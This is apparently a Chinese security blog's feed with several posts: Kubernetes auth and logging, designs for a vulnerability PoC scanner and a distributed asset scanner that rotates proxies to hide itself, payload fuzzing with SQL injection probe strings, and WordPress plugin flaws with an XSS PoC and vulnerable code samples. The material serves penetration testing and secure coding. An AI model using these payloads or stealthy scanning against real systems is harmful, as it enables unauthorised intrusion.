<h5 id="容器认证安全"><em>容器认证安全</em></h5>

<p>我们在进行集群的控制时，需要注意做好访问控制，而k8s恰好自带了一套完整的认证授权机制。</p>

<ul>
  <li>
    <p>基于属性的访问控制(ABAC)，基于属性的访问控制(ABAC)定义了一种访问控制范式，通过将属性组合在一起的策略将访问权限授予用户。策略可以使用任何类型的属性(用户属性、资源属性、对象、环境属性等)。</p>
  </li>
  <li>
    <p>基于角色的访问控制(RBAC)是一种基于企业中单个用户的角色来调节对计算机或网络资源的访问的方法。在此上下文中，访问是单个用户执行特定任务的能力，例如查看、创建或修改文件。</p>
  </li>
  <li>
    <p>NODE 授权——一个特殊用途的授权器，根据调度到kubelet所在节点的pod向kubelet授予权限。有关使用节点授权模式的更多信息，请参见节点授权。</p>
  </li>
  <li>
    <p>WEBHOOK 授权——WebHook是当某个事件发生时触发一个HTTP POST的回调;实现webhook的web应用程序将向URL发送一条消息。有关使用Webhook模式的更多信息，请参见Webhook模式。</p>
  </li>
</ul>

<p>在进行访问控制时，k8s采用的是链式认证, 每个请求被认证插件验证时，插件会试图将请求与以下属性进行关联：</p>

<ul>
  <li>api server 认证方式(k8s 的所有访问都是通过 api server)</li>
  <li>https 证书认证: 基于CA根证书签名的双向数字证书认证方式</li>
  <li>http token 认证: 通过一个token来识别合法用户</li>
  <li>http basic 认证: 通过用户名密码的方式认证</li>
  <li>authenticating proxy: 第三方授权协议</li>
</ul>

<p>当启用多个验证器模块时，第一个模块将成功地验证 “请求短路评估” (request short-circuits evaluation)，如果验证失败，则进行断路操作，api服务器不保证运行验证器的执行顺序。</p>

<p>所有通过验证的用户都会被添加进system:authenticated组。</p>

<p>可以使用authenticating proxy 或authentication webhook与其他身份验证协议(LDAP、SAML、Kerberos、备用x509方案等)集成。</p>

<h5 id="容器及平台日志分析"><em>容器及平台日志分析</em></h5>

<p>Kubernetes本身没有提供集群级别的日志管理功能，如想实现集群级别的日志管理有三种方案：</p>

<ul>
  <li>在每个Node中运行日志采集代理，将日志收集到集中的日志管理平台。这种方案对应用没有侵入性，是优选方案。</li>
  <li>在前一种方案的基础上，在每个应用Pod中增加Sidecar容器来实现日志的分离。</li>
  <li>应用直接将日志输出到统一的日志管理平台，不在本地落地，这种方案对于应用的侵入性较大。</li>
</ul>

<p>实践过的方式是第一种，一般k8s集群的容器日志都存储在/var/lib/docker/。所以简单来说，本方式就是在每个node上各运行一个日志代理容器，对各个节点/var/log和/var/lib/docker/containers/两个目录下的日志进行采集，然后汇总到elasticsearch集群，最后通过kibana展示。</p>

<p>至于中间流程的规则筛选和检测策略，可以借助自定义或者Sisdig之类工具的规则来配置。</p>

<h3 id="市场方案调研">市场方案调研</h3>

<p>当然，大家如果预算足够的话，可以直接采购整套云管平台和配套资源。
我前面所描述的东西，在大点的云服务厂商那里，基本是都可以满足的。</p>

<h4 id="国内厂商部署方案">国内厂商部署方案</h4>

<p>近期由于接洽项目的需要，对接触过的几家国内的厂商容器安全方案进行过调研。</p>

<p>其中包含云厂商，也有传统安全厂商，笔者对其中部分指标进行了简要统计，这里暂不讨论未接触过的其他优秀厂商。</p>

<p>这里仅针对公开信息披露进行展示，不做具体的优劣评价，可能存在错漏和沟通失误的情况，欢迎各路大佬斧正。</p>

<p>另外，这里给个小建议，如果公司预算比较充裕，可以入手头部云厂商的产品进行环境自建。否则可以考虑采购二线云厂商+传统安全厂商，也能达到既定的大部分效果。</p>

<p>如果收尾的架构设计中，还剩下一些低性价比，但是不得不上的资源。届时手中的业务方研发能力足够作为补充的话，可以二改和对接开源的系统，逐步推进实施落地。</p>

<p>另外，需要特别注意业务方的需求，云环境的要求是否必须纯粹，是否需要等保等级规划，不同的需求成本差别可能会很大。</p>

<p>这里附上调研过的几家厂商能力矩阵，不代表本人观点，如有错漏欢迎指出：</p>

<table>
  <thead>
    <tr>
      <th>安全能力</th>
      <th>阿里</th>
      <th>腾讯</th>
      <th>华为</th>
      <th>深信服</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>隔离沙箱</td>
      <td>ACK安全隔离沙箱</td>
      <td>未知</td>
      <td>仅数据沙箱</td>
      <td>未知</td>
    </tr>
    <tr>
      <td>基线检查</td>
      <td>安骑士</td>
      <td>未知</td>
      <td>HSS</td>
      <td>BVT</td>
    </tr>
    <tr>
      <td>漏洞检查</td>
      <td>CSS</td>
      <td>VSS</td>
      <td>VSS</td>
      <td>传统漏扫</td>
    </tr>
    <tr>
      <td>资产核查</td>
      <td>资产管理（专有云）+指纹核查（企业版）</td>
      <td>云资产管理中心</td>
      <td>ROMA资产中心</td>
      <td>未知</td>
    </tr>
    <tr>
      <td>主机安全</td>
      <td>安骑士</td>
      <td>CWP</td>
      <td>HSS</td>
      <td>EDR</td>
    </tr>
    <tr>
      <td>密钥管理KMS</td>
      <td>KMS</td>
      <td>HSM</td>
      <td>HSM</td>
      <td>未知</td>
    </tr>
    <tr>
      <td>是否支持纯私有云</td>
      <td>不支持</td>
      <td>支持</td>
      <td>不支持</td>
      <td>可配合采购</td>
    </tr>
  </tbody>
</table>

<h3 id="参考文章">参考文章</h3>

<p><a href="https://www.freebuf.com/column/173989.html">Docker容器安全最佳实践白皮书V1.0</a></p>

<p><a href="https://www.cnblogs.com/ajianboke/p/10917776.html">Kubernetes集群安全配置案例</a></p>

<p><a href="https://www.aliyun.com/solution/security/containersecurity">阿里云容器安全解决方案</a></p>

<p><a href="http://weekly.dockerone.com/article/10098">容器安全在证券行业的最佳实践</a></p>

<p><a href="https://blog.csdn.net/squirrelanimal0922/article/details/82492557">10个确保微服务与容器安全的最佳实践</a></p>

<p><a href="https://www.freebuf.com/articles/es/239266.html">使用Anchore Engine来完善DevSecOps工具链</a></p>

<p><a href="https://www.freebuf.com/articles/system/221319.html">Docker容器安全性分析</a></p>

<p><a href="https://juejin.im/entry/577083fd5bbb5000596a1528">Docker 安全</a></p>

<p><a href="https://blog.csdn.net/java_zyq/article/details/82179175">从零开始搭建K8S–如何监控K8S集群日志</a></p>

<p><a href="https://zhuanlan.zhihu.com/p/43671511">Docker安全入门与实战：Sysdig</a></p>

<p><a href="https://baijiahao.baidu.com/s?id=1610191436506146444">谈一下Docker与Kubernetes集群的日志和日志管理</a></p>
]]></content>
      <categories>
        
          <category> cloud </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[漏洞POC验证系统实践]]></title>
      <url>/scanner/2020/08/11/all-info-scan/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>在渗透过程中，我们针对特定的系统，在通过插件识别类型后，可以利用漏洞脚本进行fuzz。</strong></span>
</p>

<p><img src="https://gitee.com/hellsec/ppp/raw/master/2020-11-30/1606731837227-%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81POC%E7%B3%BB%E7%BB%9F.jpg" alt="漏洞POC验证系统全景图" /></p>

<h3 id="系统综述">系统综述</h3>

<p>在本系统设计之初，是采用的也是分布式平台设计架构，后来因为考虑和分布式资产扫描平台兼容接口，最后为了解耦合，完全改成了单机版。</p>

<p>首先我们可以看到，在这个地方我们没有单独设计web管理端，只能通过命令行去调度。</p>

<p>但是，在设计时预留了守护进程rest api，可以接受第三方平台发来的调度请求。</p>

<p>在插件模块调用方面，主模块有三个：</p>

<ul>
  <li>流行漏洞插件：主要用于复现常见手工测试用的手段，以及部分团队挖掘的内部漏洞。</li>
  <li>口令漏洞插件：主要包含端口、中间件、应用的未授权和弱口令漏洞，包含弱口令字典。</li>
  <li>第三方漏洞插件：主要用于接入网上的部分开源和泄露的插件，用于结果整合和性能调优。</li>
</ul>

<p>在获取目标信息时，主要有下面几种的形式：</p>

<ul>
  <li>api调度：第三方平台通过rpc传递目标信息，对本系统的api进行调度。</li>
  <li>命令行调度：通过命令行参数传递目标信息，直接进行调度。</li>
  <li>资产导入调度：通过接入接口的方式，对于第三方平台api给出的数据进行调度扫描。</li>
</ul>

<p>本身在分布式资产扫描平台，是存在cms类别和应用类型信息的落库的。但是为了考虑内网的情况，还是单独提取了两个子模块出来：</p>

<ul>
  <li>cms鉴别插件：主要针对目标进行cms类型的鉴别，如目标匹配到本地的指纹库，会给他打上标签，否则会接入互联网查询接口。</li>
  <li>应用鉴别插件：主要针对cms类型进行补充，识别服务和应用的类型打上标签，作为第二梯队尝试。</li>
</ul>

<p>当然，除了这些模块，还有部分次要的效果优化类插件，这里就不再多提了。</p>

<p>最后，我们简单讲讲扫描结果落库的问题。</p>

<p>这里采用的是log打印存储+数据库回传分布式资产扫描平台，而回传的选项是可以关闭的，这就保障了我们在苛刻环境中本系统的兼容性。</p>

<h3 id="坑点总结">坑点总结</h3>

<p>在对于内网系统，或者存在敏感防火墙的系统进行扫描时，我们可支持接入多类型的代理。</p>

<h4 id="速率控制">速率控制</h4>

<p>在针对敏感的server进行探测时，第三方插件可能自带的口令认证爆破机制，会比较粗暴。</p>

<p>要么就是单线程转，要么就是起个粗放的线程池，容易把服务器给跑挂了，或者让人IDS给很快查到。</p>

<p>所以针对这块儿的控制，我们需要做细致优化，采用动态控制速率的策略，而不光是硬编码配置下发任务。</p>

<h4 id="数据统一">数据统一</h4>

<p>对于第三方插件，我们花了不少功夫在统一调度机制和库文件上，还有一点比较关键的点，是针对落库的格式上。</p>

<p>我们在各类插件的上报流程中，对于第三方的插件，会尽量进行数据上报层hook，统一格式后进行上报。</p>

<p>但并不是每一类插件都有统一落库记录的流程的，对于这类插件可能需要做函数重写。</p>

<h4 id="探测尺度">探测尺度</h4>

<p>我们的插件目前都是点到为止，为了遵守法律法规层面的制度，都没有进行漏洞深度利用，需要后续人工进行利用和复核。</p>

<h3 id="未来企划">未来企划</h3>

<ul>
  <li>后渗透利用：目前是没有关于内网利用信息收集的插件的，后面进行后相关poc的开发。</li>
  <li>云环境利用：对于云环境漏洞目前没有poc，后面会考虑添加。</li>
  <li>安全设备利用：对于目前流行的对于安全设备的反攻，后面会考虑专门添加插件。</li>
  <li>WAF、蜜罐探测：对于WAF类和蜜罐环境，以前只是封装了辅助类的函数，后面也会提供专门的插件进行探测。</li>
</ul>

]]></content>
      <categories>
        
          <category> scanner </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[分布式资产扫描平台实践]]></title>
      <url>/scanner/2020/07/29/poc-scan/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>以前在乙方干活的时候，对于黑盒扫描的内容研究的比较多也早。此前做了一些内部项目，但没有走涉密。本来还想出来做做开源，不过后来看着不挣钱，加上代码水准有限，也就作罢了。</strong></span>
</p>

<p>时过境迁，相关内容也不太敏感了，项目被人接手以后，应该已经做了不少迭代。</p>

<p>这里主要想跟大家分享下，原来在建设扫描平台中遇到的思路，文中会拿以前的项目进行脱敏式分析。</p>

<p><img src="https://gitee.com/hellsec/ppp/raw/master/2020-11-29/1606648128250-%E5%9F%BA%E7%A1%80%E5%85%A8%E6%99%AF%E5%9B%BE.png" alt="分布式资产采集平台基础架构" /></p>

<h3 id="平台综述">平台综述</h3>

<p>通过图中的内容可以看到，我们的平台是通过两种方式调度的：</p>

<ul>
  <li>基于命令行。</li>
  <li>基于flower（web api）。</li>
</ul>

<p>我们通过在主控服务器，调度celery借助中间件redis，将任务下发到各个agent节点。</p>

<p>此后，各个节点会根据规则，随机抽取proxy代理池里的ip，以期达到隐匿自身的作用。</p>

<p>然后，节点会通过对基础模块的复杂调用，向目标发送探测请求包，实现对信息探测结果的落库。</p>

<p>最后，我们在反馈数据回主控服务器数据库时，会采用加密方式，以免被中间人侦听。</p>

<p>我们的主要模块有：</p>

<ul>
  <li>信息探测：实现对目标开放的ip或者域名，进行端口、端口banner、服务类型和版本等基础信息探测。</li>
  <li>cms识别：主要对探测到web类型的目标，进行cms识别。</li>
  <li>社工引擎：对多个搜索引擎进行爬取，并辅以github之类的第三方接口进行补充。</li>
  <li>端口服务扫描：调用nmap和masscan接口，并辅以fofa、shodan之类的接口进行补充。</li>
  <li>路径爆破：对爬取到域名去重探活后，如不存在waf进行暴力扫描，如存在进行智能低频探测。</li>
</ul>

<p>那么，我们在以上的模块进行交叉调用后，又能得到什么结果呢：</p>

<p>基础信息：</p>

<ul>
  <li>目标base结果：包含ip、端口、端口banner、服务类型和版本。</li>
  <li>cms结果：包含cms类型、版本，如果没有会优先展示webserver。</li>
  <li>端口扫描结果：分析出真实开放的端口，筛选出其服务类型和版本。</li>
  <li>路径爆破结果：分析状态码和返回的网页内容，去重找出真实的接口和路径集合。</li>
  <li>dns资产：ip域名的基础映射集合。</li>
  <li>email资产：对于某个实体（或者根域名）的所有email资产组合。</li>
  <li>敏感词资产：对于某个实体（或者根域名）的所有敏感信息组合。</li>
</ul>

<p>整合信息（包含基础信息）：</p>

<ul>
  <li>主机资产：针对单台主机的所有基础信息探测合集。</li>
  <li>子域名资产：针对特定域名的所有子域名的基础信息合集。</li>
  <li>子网检测结果：针对特定实体下单IP段的主机资产的基础信息合集。</li>
</ul>

<h3 id="对接服务">对接服务</h3>

<p>我们讲到了我们获取的资产合集，那么我们可以对接的服务又有哪些呢？</p>

<p>前面的<a href="http://blog.hellsec.net/pentest/2017/12/16/architecture-of-apt-pentest/">《规模渗透架构部署设想》</a>里，我们提到了一些规划，目前已经研发落地的有：</p>

<ul>
  <li>漏洞POC验证系统：针对采集到的资产数据，针对CMS类型进行验证，如果不能识别会使用通用的脚本进行fuzz。</li>
  <li>渗透方案查询：类似于私有化的wiki平台，这个在前司曾经维护了一段时间，但后来改成了云笔记协作。</li>
  <li>漏洞分储系统：当时爬取了seebug等几个国内外知名漏洞库，并单独提取poc，后来由于各大接口经常改动，精力不足暂停维护。</li>
  <li>被动漏扫系统：这个落地项目在前规划里没有提到，依赖离线web流量会多一些，主要规则涵盖owasp top10，以及主流api漏洞检测，目前暂时没有主动接入本平台api，只会尝试提取生成的数据库结果。</li>
</ul>

<h3 id="适用匹配">适用匹配</h3>

<p>在当初设计平台时，碰到两个比较重要的问题。</p>

<h4 id="兼容性"><em>兼容性</em></h4>

<p>由于本身设计的属于外网资产扫描的平台，在内网渗透时会比较尴尬，很多特性都不太匹配。</p>

<p>在进行内网渗透时，兼容性都会比单机版要差很多。</p>

<p>这点在以前跟前大boss讨论时，没少被喷被教育。当然他以价值输出为导向，后来觉得讲的还是很有道理的。</p>

<p>所以后面再考虑是单开分支，还是单写逻辑在这个项目进行内网模块处理。</p>

<h4 id="便携性"><em>便携性</em></h4>

<p>系统本身是分布式的，单机版本也可以，但是启动运行效率不高。</p>

<p>当初考虑做时候，考虑过打包docker镜像，但是前大boss不太认，觉得在出去搞环境比较复杂，镜像不一定能找机会pull。</p>

<p>后来，考虑的是一键安装脚本，将容易出问题的库尽量用常规库替代，保证能一键启动关闭，然后任务在丢失后有重试和完整重放机制等等，即在容错兜底上加强了不少。</p>

<h3 id="后话">后话</h3>

<p>本文大概介绍了对于平台架构、资产收集结果的方案设计要略，后面会单独分析几个对接服务的细节，以及一些新的想法。</p>

]]></content>
      <categories>
        
          <category> scanner </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[漏洞扫描：从fuzz到payload]]></title>
      <url>/scanner/2019/11/19/from-fuzz-to-payload/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#00B050;"><strong>在实现漏洞扫描的时候，部分开发者会使用payload直接进行fuzz，而且并没有对server端的拦截和过滤，有相对智能的反馈，这对扫描效率和成功率是影响比较大的。</strong></span>
</p>

<p>那么，我们该如何去实现精细化定制呢？</p>

<h3 id="字符fuzz">字符fuzz</h3>

<p>另外，在存在waf的时候，我们发送payload过多，可能直接会触发server端的拒绝服务或者ban ip的操作，所以要在保持一定的发包频率的情况下，尽可能少触发waf的规则。
另外，web系统本身可能自带了过滤，如果无脑发payload，可能fuzz了半天都是白费功夫。
在字符形态的时候，如果能直接过滤掉一批有害或者无效字符，能较大程度上提升扫描器的效率。</p>

<h3 id="字符规则过滤">字符规则过滤</h3>

<p>在检测时，先通过<strong>字符键值对</strong>进行探测，如果不通过，则在黑名单库里加上该<strong>字符键值对</strong>。然后，我们再接着尝试<strong>单边字符</strong>是否被过滤，过滤了再把<strong>单边字符</strong>加入黑名单，这样能在一定程度上提升检测效率。</p>

<p>校验存在键值对的流程：
<img src="https://s2.ax1x.com/2019/12/26/lEax00.png" alt="lEax00.png" /></p>

<div class="highlighter-rouge"><pre class="highlight"><code>graph LR
字符键值对--&gt;payload流程
</code></pre>
</div>

<p>需要注意的是，我们在进行字符fuzz的时候，别忘了加入定位的keyword，不然在复杂的response响应中，不太容易匹配到。</p>

<p>键值对举例如下：</p>

<div class="highlighter-rouge"><pre class="highlight"><code><span class="p">{</span><span class="err">payload</span><span class="p">}</span><span class="w">
</span><span class="err">--</span><span class="w">
</span><span class="err">&lt;payload&gt;</span><span class="w">
</span><span class="p">[</span><span class="err">payload</span><span class="p">]</span><span class="w">
</span><span class="err">(payload)</span><span class="w">
</span><span class="err">||</span><span class="w">
</span><span class="err">&amp;&amp;</span><span class="w">
</span><span class="err">/*payload*/</span><span class="w">
</span></code></pre>
</div>

<p>校验不存在键值对的流程：</p>

<p><img src="https://s2.ax1x.com/2019/12/26/lEavmq.png" alt="lEavmq.png" /></p>

<div class="highlighter-rouge"><pre class="highlight"><code>graph LR
字符键值对--&gt;单个字符
单个字符--&gt;payload流程
</code></pre>
</div>

<p>单个字符举例如下：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>?
'
"
+
#
;
,
～
</code></pre>
</div>
<p>当然，有人会问是不是每种漏洞类型的检测，都需要按照上述list。</p>

<p>很明显不是啊，每种漏洞检测需要用到的字符集是不一样的，所以需要根据实际检测的情况，以及所使用的payload库进行分类处理。</p>

<p>最后，我们可以根据需要，生成<strong>字符（键值对）</strong> 到黑名单库，从而转到<strong>payload流程</strong>进行下一步判断。</p>

<h3 id="从fuzz到payload">从fuzz到payload</h3>

<p>那么我们已经获取到黑名单<strong>字符（键值对）</strong>以后，该如何去尝试fuzz payload呢？</p>

<p>每个人习惯不一样，这里可以直接提取黑名单里的内容作为list，接着挨个对payload进行对比尝试，如果满足黑名单条件，则从fuzz列表里去除掉。</p>

<p>这样一来，能在一定程度上减少fuzz发包数，简易代码示例：</p>

<div class="highlighter-rouge"><pre class="highlight"><code># /usr/bin/python2.X
...
...

#init payload list
fuzz_payload = orig_payload

for y in orig_payload:
    for x in char_blacklist:
        #x may be: '(.*?)'
        if re.match(x, y):
            fuzz_payload.remove(x)
</code></pre>
</div>

<h3 id="手工简化payload">手工简化payload</h3>

<p>拿刷众测举例，我们常常需要在短时间内定位到一个参数是否含有漏洞，配合自动化提交快人一步。</p>

<p>就sql注入而言，某某曾说过一个参数发两个包就能确认是否含有注入，发四个包就能确定是什么数据库。</p>

<p>当然可能讲的稍微夸张，但理确实是这个理。</p>

<p>我们先需要通过fuzz点，来确认单参数是否含有sql注入。这里可以提下，一旦结束单参数fuzz，我们可以直接结束掉该url所有参数的fuzz。</p>

<p>另外，不少厂商是是接受多点同类漏洞的，这意思是拿到某个或者某类参数，我们可以去尝试自动化类比fuzz其他地方，是否也存在相似问题。</p>

<p>过滤掉前面的的黑名单字符集，把poc打散然后闭合和注释，再通过判断content-length差距、页面hash变化、时间延时变化，分两步检测快速fuzz出初步结果。</p>

<div class="highlighter-rouge"><pre class="highlight"><code>or 8 &lt; 9
or 0 between 8 and 9
and 8 &gt; 9
xor 8 &gt; 9
xor 0 between 8 and 9
or sleep(8)
and sleep(8)
xor sleep(8)
;select sleep(8)
</code></pre>
</div>

<p>接着，我们可以通过主流数据库的<strong>单个甄别性</strong>查询语句（比如mssql/oracle/mysql/…），分独立的包发送进行探测，这样能很快的作出判断。</p>

<p>可能有人会说，这样可能会漏掉部分特殊的点。</p>

<p>拜托，众测的时候就是比手快的，你说一个url所有参数都跑一遍的话，就拿sqlmap举例，如果某个点稍微有点特殊，可能几分钟都过去了，才能判断那个点是不是有注入。</p>

<p>如果你在半小时后找到个注入，人家已经在十来分钟的时候提交了，不把人气的吐血三升？</p>

<p>而且，并不是说我们就不关注细节。只不过是做深入fuzz的优先级是相对的，我们需要优先关注cover的广度，而不是cover的深度。</p>

<p>最后，我们可以最快速度得出结果后，再后续使用专用fuzz工具进行二段攻击。</p>

<h3 id="分级fuzz">分级fuzz</h3>

<p>另外，在发送payload之前，我们能够检测到系统框架的类型，是一个比较有利的起手，这代表我们可以不用盲目尝试payload。</p>

<p>在使用网上的payload的同时，我们也需要去尽可能的去分级和简化。大家要相信，这玩意儿是给自己或者团队用的，不是用来忽悠客户的。</p>

<p>搞一堆华丽丽的东西，最后自己吃没吃饱，只有自家的肚子知道。</p>

<p>分级和简化payload后的结果就是，比如在使用传统扫描器（含接口）如sqlmap和awvs的时候，大家可能永远会觉得机器会帮你扫出来，永远有惰性不会去精简poc，别人一键化拿shell的时候，你可能才刚刚确认cms框架类型。</p>

<p>最终，我们根据测试的场景，可以将手中的扫描器按测试需求，分级别去发送payload：</p>

<ul>
  <li>level1: 最简单可以获取基础反馈的poc。</li>
  <li>level2: 直接可以获取数据和证明危害的payload。</li>
  <li>level3: 直接可以获取shell，或者证明rce/上传漏洞存在的txt文件。</li>
</ul>

<p>当然，如果这里调的level比较高的话，低级别的poc检测成功后，是可以向上跃迁检测的。</p>

<p>另外，这里不建议优先采用公共dns平台，因为即使是使用了api交互，公共dns平台也一般会有延时的风险，更别提可能被GA监控管制，再者说证明截图啥的，也需要时间的。</p>

]]></content>
      <categories>
        
          <category> scanner </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Wordpress插件漏洞的攻防浅析]]></title>
      <url>/vuln/2019/10/23/wordpress-adsec/</url>
      <content type="html"><![CDATA[<p>
	<span style="color:#DAA520;"><strong>一般出名点的开源软件，比如wordpress的核心高危漏洞是比较难挖的。但其附属的高用户量的插件漏洞也是具有一定的价值的，而挖掘起来相对容易些，这里就来简单谈谈wordpress插件漏洞的挖掘和修复。</strong></span>
</p>

<h3 id="常用输入点">常用输入点</h3>

<ul>
  <li>$_GET</li>
  <li>$_POST</li>
  <li>$_REQUEST</li>
  <li>$_SERVER[‘REQUEST_URI’]</li>
  <li>$_SERVER[‘PHP_SELF’]</li>
  <li>$_SERVER[‘HTTP_REFERER’]</li>
  <li>$_COOKIE</li>
</ul>

<p>如果要挖掘指定的cms漏洞，我们就需要去寻找代码里，一些比较重要的自带函数是否存在漏洞。或者也可以看看一些安全过滤函数，是否得到了正确应用。</p>

<h3 id="输入检查">输入检查</h3>

<p>例如， 开发者可以使用sanitize_email()来清理电子邮件的地址，使用sanitize_text_field()来清理文本，使用sanitize_sql_orderby()来验证SQL的ORDER BY语句等。 WordPress中的sanitize_*()类辅助函数已经覆盖了大多数用户输入类型：</p>

<ul>
  <li>sanitize_email()</li>
  <li>sanitize_file_name()</li>
  <li>sanitize_hex_color()</li>
  <li>sanitize_hex_color_no_hash()</li>
  <li>sanitize_html_class()</li>
  <li>sanitize_key()</li>
  <li>sanitize_meta()</li>
  <li>sanitize_mime_type()</li>
  <li>sanitize_option()</li>
  <li>sanitize_sql_orderby()</li>
  <li>sanitize_text_field()</li>
  <li>sanitize_title()</li>
  <li>sanitize_title_for_query()</li>
  <li>sanitize_title_with_dashes()</li>
  <li>sanitize_user()</li>
  <li>esc_url_raw()</li>
  <li>wp_filter_post_kses()</li>
  <li>wp_filter_nohtml_kses()</li>
</ul>

<h3 id="输出检查">输出检查</h3>

<p>如果没有做好输出检查，可能会导致各种模板注入或者xss一类的漏洞。</p>

<ul>
  <li>esc_html() 更改html响应类型</li>
  <li>esc_url() 过滤url里的内容。</li>
  <li>esc_js()  过滤内联js内容的输出内容。</li>
  <li>esc_attr() 用于过滤输出点在标签属性中的情况，相应的转义。</li>
  <li>esc_textarea() 用于过滤输出点在textarea标签中的情况，相应的转义。</li>
  <li>tag_escape() 用于出现在HTML标签中的情况，主要用于正则。</li>
</ul>

<h3 id="xss">xss</h3>

<p>举例：</p>

<ul>
  <li>add_query_arg()</li>
  <li>remove_query_arg()</li>
</ul>

<p>上面两个是wordpress用来动态添加/删除参数的，要是保持默认不指定字符串作为参数：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>echo add_query_arg( array(
    'key1' =&gt; 'value1',
    'key2' =&gt; 'value2',
), 'http://example.com' );
</code></pre>
</div>

<p>他会使用未经过转义的$_SERVER[‘REQUEST_URI’]，而不是$_SERVER[‘PHP_SELF’]，这样直接打印出来可能会造成xss漏洞。</p>

<p>防范的话：</p>
<ul>
  <li>在重定向或者header里面建议使用esc_url_raw。</li>
  <li>打印完整url时，需要使用esc_url来转为HTML实体。</li>
</ul>

<p>如果完全不考虑在文章里加入未过滤的html标签，有个函数是对wordpress超级管理员也生效的
如果要屏蔽所有的用户，包括管理员，超级管理员，我们可以这样设置：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>define( 'DISALLOW_UNFILTERED_HTML', true );
</code></pre>
</div>

<h4 id="输出渲染导致的html实体编码失效">输出渲染导致的HTML实体编码失效</h4>

<p>比如，在WordPress内置的编辑器Gutenberg中（WordPress 5.0到5.2.2相关联），FortiGuard Labs的威胁研究人员Zhouyuan Yang表示，如果文章中包含一条“Shortcode”的错误信息，则Gutenberg无法过滤文章的javascript/HTML代码。</p>

<p>Shortcode本质上是WordPress用户用来嵌入文件或创建对象的快捷方式，这些对象和文件通常涉及复杂的代码，而Shortcode数据块可以通过单击Gutenberg编辑器中的“Add Block”按钮添加到页面中。</p>

<p>然而，根据分析，当将某些被编码的HTML字符(如\&lt;)添加到Shortcode数据块中时，就会发生某些错误。</p>

<p>在Wordpress预览文章时会把\&lt;解码为&lt;，此时XSS过滤器毫无反应。相关PoC：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>&amp;gt;&amp;lt;img src=1 on error=prompt(1)&amp;gt;。
</code></pre>
</div>

<p>这种情况下就只有直接replace特殊符号为空了，不过也算小概率事件，一般在富文本渲染和留言处多见。</p>

<h4 id="响应格式不明">响应格式不明</h4>

<p>另外，在没有选项参数的情况下使用json_encode函数，会导致PHP不会转义其他字符（参见JSON_HEX_TAG）。因此，我们可以将任意HTML注入到响应中，但是没有浏览器会在JSON响应中评估HTML吗？好吧，只有当您的JSON响应告诉浏览器它实际上就是JSON的时候才会评估，示例见：
<a href="https://xz.aliyun.com/t/2643">json_encode</a></p>

<div class="highlighter-rouge"><pre class="highlight"><code>function evomdt_ajax(){
  if(empty($_POST['type'])) return;

  $type = $_POST['type'];
  $output = '';

  switch($type){
  case 'newform':
    echo json_encode(array(
      'content' =&gt;$this-&gt;mdt_form($_POST['eventid'], $_POST['tax']),
      'status'=&gt;'good'
    )); exit;
  break;
  case 'editform':
    echo json_encode(array(
      'content' =&gt;$this-&gt;mdt_form($_POST['eventid'], $_POST['tax'],$_POST['termid'] ),
      'status'=&gt;'good'
    )); exit;
  break;
}
</code></pre>
</div>

<p>响应格式为text/html，而不是application/json：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>HTTP/1.1 200 OK
[...]
Content-Type: text/html; charset=UTF-8

{"content":[...]
</code></pre>
</div>

<h3 id="sql注入">SQL注入</h3>

<p>下面是wordpress自带的不安全的sql查询关键词，需要我们单独去调用过滤函数：</p>

<ul>
  <li>$wpdb-&gt;query()</li>
  <li>$wpdb-&gt;get_var()</li>
  <li>$wpdb-&gt;get_row()</li>
  <li>$wpdb-&gt;get_col()</li>
  <li>$wpdb-&gt;get_results()</li>
  <li>$wpdb-&gt;replace()</li>
</ul>

<p>安全的sql函数：</p>

<ul>
  <li>$wpdb-&gt;insert()</li>
  <li>$wpdb-&gt;update()</li>
  <li>$wpdb-&gt;delete()</li>
  <li>$wpdb-&gt;prepare()</li>
</ul>

<p>在wordpressv3.5以前，可以直接拼接传入语句，容易出现SQL注入漏洞：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>$wpdb-&gt;query( $wpdb-&gt;prepare( "INSERT INTO table (user, pass) VALUES ('$user', '$pass')" ) );
</code></pre>
</div>

<p>现在新版的wordpress里面声明就友好多了，需要占位符依次传入参数：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>&lt;?php $sql = $wpdb-&gt;prepare( 'query' , value_parameter[, value_parameter ... ] ); ?&gt;
</code></pre>
</div>

<p>下面的函数挺好用，但这里的转义只会转义特殊字符，对于order by和未用单引号闭合的参数是不能预防的。</p>

<ul>
  <li>esc_sql()</li>
  <li>escape()</li>
  <li>esc_like()</li>
  <li>like_escape()</li>
</ul>

<p><strong>$wpdb-&gt;prepare()真香系列。</strong></p>

<p>官方的说法是：</p>

<blockquote>
  <p>In 99% of cases, you can use $wpdb-&gt;prepare() instead, and that is the recommended method.</p>
</blockquote>

<blockquote>
  <p>This function is only for use in those rare cases where you can’t easily use $wpdb-&gt;prepare().</p>
</blockquote>

<blockquote>
  <p>One example is preparing an array for use in an IN clause.</p>
</blockquote>

<p>注意，新版wordpress会自动将$_GET$_POST$_COOKIE$_SERVER中的值，使用add_magic_quotes方法进行过滤。</p>

<p>但值得一提的是，随后，将过滤后的GET与POST数组合并后覆盖$_REQUEST。在以往一些安全性不高的程序中，往往会出现，过滤了GET与POST，却忘记过滤REQUEST的情况，导致漏洞的产生。</p>

<p>另外，在传入数组时，wordpress不会对数组成员进行add_magic_quotes转义。</p>

<p>另外，WordPress除了强制向输入内容添加斜杠外，它还提供了几个内置的过滤函数，用于清理用户输入和保护内容输出。</p>

<p>下面的屏蔽SQL错误，虽然不防延时注入（手动滑稽）：</p>

<div class="highlighter-rouge"><pre class="highlight"><code>&lt;?php $wpdb-&gt;show_errors(); ?&gt; 
